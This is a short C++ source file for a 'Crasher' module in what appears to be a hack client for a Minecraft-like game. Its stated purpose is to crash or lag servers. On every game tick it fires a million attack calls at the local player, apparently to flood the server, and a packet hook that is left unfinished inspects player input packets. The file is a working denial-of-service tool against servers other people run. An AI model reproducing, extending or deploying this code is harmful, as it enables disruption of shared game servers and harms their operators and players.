#include "Crasher.h"

Crasher::Crasher()
    : Module("Crasher", "Crashes or lags some servers.", Category::WORLD) {
}

void Crasher::onNormalTick(LocalPlayer* localPlayer) {
    if (!Game::getLocalPlayer()) return;

    GameMode* gm = Game::getLocalPlayer()->getgameMode();
    LocalPlayer* lp = Game::getLocalPlayer();

    for (int i = 0; i < 1000000; i++) {
        gm->attack(lp);
    }
}


void Crasher::onSendPacket(Packet* packet, bool& cancel) {
    if (!packet) return;

    if (packet->getId() == PacketID::PlayerAuthInput) {
        PlayerAuthInputPacket* authPacket = (PlayerAuthInputPacket*)packet;
        auto player = Game::getLocalPlayer();
        if (!player) return;
    }
}